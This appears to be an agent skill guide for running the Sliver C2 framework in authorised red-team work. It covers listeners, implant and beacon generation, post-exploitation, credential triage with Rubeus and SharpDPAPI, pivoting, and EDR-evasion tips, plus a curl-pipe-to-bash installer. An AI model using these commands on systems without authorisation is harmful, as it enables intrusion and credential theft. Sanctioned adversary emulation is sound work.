---
name: operating-sliver-c2
description: Stand up a Sliver C2 server and mTLS listeners, generate cross-platform implants and beacons, and run post-exploitation, pivoting, and BOF/.NET tooling via the Armory for adversary emulation. Use when running authorized, rules-of-engagement-bound red-team engagements that need a full open-source C2 lifecycle spanning server setup, implant generation, and post-exploitation tradecraft. Do not use for the Havoc C2 framework and Demon agents - use operating-havoc-c2.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- command-and-control
- sliver
- adversary-emulation
- implant
- post-exploitation
- pivoting
- mtls
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1071.001
---
# Operating Sliver C2

> **Legal Notice:** This skill is for authorized security testing, red-team engagements, and educational purposes only. Operating a command-and-control framework against systems you do not own or lack explicit written authorization to test is illegal and may violate computer fraud, wiretap, and abuse statutes. Always work within a signed rules-of-engagement document.

## Overview

Sliver is an open-source, cross-platform adversary emulation and command-and-control (C2) framework developed by BishopFox (https://github.com/BishopFox/sliver). It is written in Go and is widely used by red teams as a modern, open alternative to commercial frameworks such as Cobalt Strike. Sliver supports two implant interaction models: **sessions** (interactive, real-time) and **beacons** (asynchronous check-in with configurable jitter), and it speaks C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS. Each implant is dynamically compiled with per-binary, asymmetric encryption keys, so no two implants share static signatures.

Sliver also ships an **armory** — an alias and extension package manager that installs third-party tooling such as Beacon Object Files (BOFs) and .NET assemblies (e.g., `sharpdpapi`, `seatbelt`, `rubeus`) for in-memory execution. Because Sliver has been adopted by real threat actors (documented by Cybereason, Microsoft, and others), exercising it during sanctioned engagements is valuable both for emulating realistic adversary tradecraft and for validating that defensive controls (EDR, network detection, DNS monitoring) catch its C2 channels. This skill covers deploying the server, generating implants, managing listeners, running post-exploitation, and pivoting through compromised hosts.

## When to Use

- When conducting an authorized red-team engagement that requires a resilient, multi-protocol C2 channel
- When emulating a specific threat actor's TTPs that include Sliver (per CTI reporting) during a purple-team exercise
- When validating that EDR and network monitoring detect mTLS/HTTPS/DNS beaconing
- When demonstrating post-exploitation and lateral movement impact for a report

## Prerequisites

- A dedicated Linux redirector/team-server host (Sliver server runs on Linux/macOS/Windows; Linux is standard)
- Root or sudo for binding privileged ports (443/53) and installing the multiplayer daemon
- Outbound/inbound network reachability matching the chosen C2 protocol
- Familiarity with Active Directory and post-exploitation concepts
- Signed authorization / rules of engagement

Install Sliver server with the official one-liner, or download release binaries:

```bash
# Official installer (downloads latest sliver-server + client)
curl https://sliver.sh/install | sudo bash

# Or download specific release binaries from GitHub
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x sliver-server_linux sliver-client_linux
```

## Objectives

- Launch the Sliver server console and operate in single- or multiplayer mode
- Start mTLS, HTTPS, and DNS C2 listeners
- Generate session and beacon implants for multiple OS/architectures
- Stage implants and host them for delivery
- Interact with callbacks, run post-exploitation, and dump credentials
- Install and run armory extensions (BOFs and .NET assemblies)
- Pivot through a compromised host into segmented networks

## MITRE ATT&CK Mapping

| ID | Technique | Use in this skill |
|----|-----------|-------------------|
| T1071.001 | Application Layer Protocol: Web Protocols | Sliver HTTP(S) C2 listeners blend implant traffic with normal web traffic |

Related techniques exercised by the workflow:

| ID | Technique |
|----|-----------|
| T1572 | Protocol Tunneling (WireGuard / pivot tunnels) |
| T1090.001 | Internal Proxy (Sliver pivots) |
| T1059 | Command and Scripting Interpreter (implant execute-assembly / shell) |
| T1620 | Reflective Code Loading (in-memory .NET execution) |

## Workflow

### Step 1: Start the Sliver server console

Run the server interactively to get the operator console:

```bash
sudo ./sliver-server
```

Inside the `sliver >` console, confirm version and view help:

```
sliver > version
sliver > help
```

### Step 2: (Optional) Configure multiplayer for a team

On the server, generate an operator config and start the multiplayer listener:

```
sliver > new-operator --name operator1 --lhost teamserver.example.com --save ./operator1.cfg
sliver > multiplayer --lport 31337
```

Distribute `operator1.cfg` to teammates, who import it with the standalone client:

```bash
./sliver-client import ./operator1.cfg
./sliver-client
```

### Step 3: Start C2 listeners

Start one or more listeners. mTLS is the most robust; HTTPS blends with web traffic; DNS is the stealthiest egress for restrictive networks:

```
# Mutual TLS listener on 443
sliver > mtls --lport 443

# HTTPS listener (serves on 443 by default; supports custom certs)
sliver > https --lport 443

# Plain HTTP (useful behind a TLS-terminating redirector)
sliver > http --lport 80

# DNS listener for a delegated zone you control
sliver > dns --domains c2.example.com. --lport 53

# View running listeners / background jobs
sliver > jobs
```

### Step 4: Generate implants

Generate a session implant pointing at your mTLS endpoint:

```
sliver > generate --mtls teamserver.example.com:443 --os windows --arch amd64 --format exe --save /tmp/
```

Generate a **beacon** with jitter for asynchronous, lower-noise operation:

```
sliver > generate beacon --mtls teamserver.example.com:443 --os windows --arch amd64 --seconds 60 --jitter 30 --save /tmp/
```

Other useful formats and channels:

```
# HTTPS beacon, shellcode format for injection
sliver > generate beacon --http teamserver.example.com --os windows --arch amd64 --format shellcode --save /tmp/

# DNS implant for egress-restricted targets
sliver > generate --dns c2.example.com. --os windows --format exe --save /tmp/

# Linux/macOS ELF/Mach-O implants
sliver > generate --mtls teamserver.example.com:443 --os linux --arch amd64 --format elf --save /tmp/

# List and remove generated implant builds
sliver > implants
sliver > implants rm IMPLANT_NAME
```

### Step 5: Stage implants (optional)

Host a stager for size-constrained delivery. First start a stage listener, then generate a matching stager:

```
sliver > profiles new --mtls teamserver.example.com:443 --format shellcode --os windows --arch amd64 win-stage
sliver > stage-listener --url tcp://teamserver.example.com:8443 --profile win-stage
sliver > generate stager --lhost teamserver.example.com --lport 8443 --arch amd64 --format c
```

### Step 6: Interact with callbacks

When an implant calls back, list and select it:

```
# Interactive sessions
sliver > sessions
sliver > use SESSION_ID

# Asynchronous beacons
sliver > beacons
sliver > use BEACON_ID
```

Inside an interactive session run core post-exploitation commands:

```
sliver (SESSION) > info
sliver (SESSION) > whoami
sliver (SESSION) > getprivs
sliver (SESSION) > ls
sliver (SESSION) > netstat
sliver (SESSION) > ps -T            # show injected/protected processes
sliver (SESSION) > screenshot
sliver (SESSION) > execute -o whoami /all
```

Get a system shell or run a command without spawning a noisy cmd.exe:

```
sliver (SESSION) > shell            # full interactive shell (noisy; use sparingly)
sliver (SESSION) > execute -o ipconfig /all
```

### Step 7: Privilege escalation and credential access

```
# Migrate into another process / impersonate
sliver (SESSION) > migrate PID
sliver (SESSION) > make-token -u DOMAIN\\user -p Password123
sliver (SESSION) > getsystem        # attempt SYSTEM via service/named-pipe

# Run .NET tooling in memory (after armory install, see Step 8)
sliver (SESSION) > rubeus triage
sliver (SESSION) > seatbelt -group=system
```

### Step 8: Install and run armory extensions

The armory installs BOFs and .NET assemblies for in-memory use:

```
sliver > armory                     # list available packages
sliver > armory install all         # or: armory install rubeus / sharpdpapi / etc.
sliver > armory update
```

Once installed, the alias/extension is available inside a session as a first-class command:

```
sliver (SESSION) > sharp-dpapi triage
sliver (SESSION) > sa-whoami        # SA = situational awareness BOFs
sliver (SESSION) > inline-execute-assembly /opt/tools/Seatbelt.exe -group=all
```

### Step 9: Pivot into segmented networks

Sliver supports named-pipe and TCP pivots plus SOCKS/port-forwarding for tooling:

```
# Start a SOCKS5 proxy over the implant for proxychains-driven tools
sliver (SESSION) > socks5 start --port 1081

# Local/reverse port forwards
sliver (SESSION) > portfwd add --bind 127.0.0.1:3389 --remote 10.0.5.20:3389

# TCP pivot listener on the beachhead so deeper implants chain through it
sliver (SESSION) > pivots tcp --bind 0.0.0.0:9898
sliver > generate --tcp-pivot 10.0.5.10:9898 --os windows --format exe --save /tmp/
sliver (SESSION) > pivots                # list active pivot graph
```

### Step 10: Clean up

Remove implants, close sessions, and stop listeners at engagement end:

```
sliver (SESSION) > kill              # terminate the implant cleanly
sliver > jobs -k JOB_ID             # stop a specific listener
sliver > implants rm IMPLANT_NAME
```

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| Sliver (BishopFox) | C2 framework source and releases | https://github.com/BishopFox/sliver |
| Sliver Wiki | Official documentation | https://github.com/BishopFox/sliver/wiki |
| Sliver docs site | Migrated docs | https://sliver.sh/docs |
| Sliver Armory | Extension/alias package index | https://github.com/sliverarmory |
| MITRE ATT&CK T1071.001 | Web Protocols technique | https://attack.mitre.org/techniques/T1071/001/ |

## OPSEC and Detection Considerations

| Channel | Blends with | Defender detection opportunity |
|---------|-------------|-------------------------------|
| mTLS (443) | TLS traffic | JA3/JA3S fingerprinting, self-signed cert anomalies |
| HTTPS | Web browsing | Beaconing periodicity, URI/User-Agent profiling |
| DNS | DNS resolution | High-entropy/long subdomain queries, TXT volume |
| WireGuard | VPN traffic | Unexpected UDP tunnels from workstations |

- Prefer **beacons with jitter** over interactive sessions to reduce timing regularity.
- Avoid `shell` — it spawns `cmd.exe`/`powershell.exe` children that EDR flags; prefer `execute` and inline assemblies.
- Use redirectors (nginx/Apache) in front of HTTP(S) listeners so the team server IP is never exposed.

## Validation Criteria

- [ ] Sliver server console launches and `version` reports the installed build
- [ ] At least one listener (mTLS/HTTPS/DNS) is running and visible in `jobs`
- [ ] A session implant and a beacon implant are generated for the target OS/arch
- [ ] An implant calls back and appears in `sessions`/`beacons`
- [ ] Post-exploitation commands (`info`, `whoami`, `screenshot`) execute successfully
- [ ] An armory extension is installed and executed in-memory
- [ ] A SOCKS proxy or port-forward is established for pivoting
- [ ] Implants killed, listeners stopped, and artifacts removed at cleanup
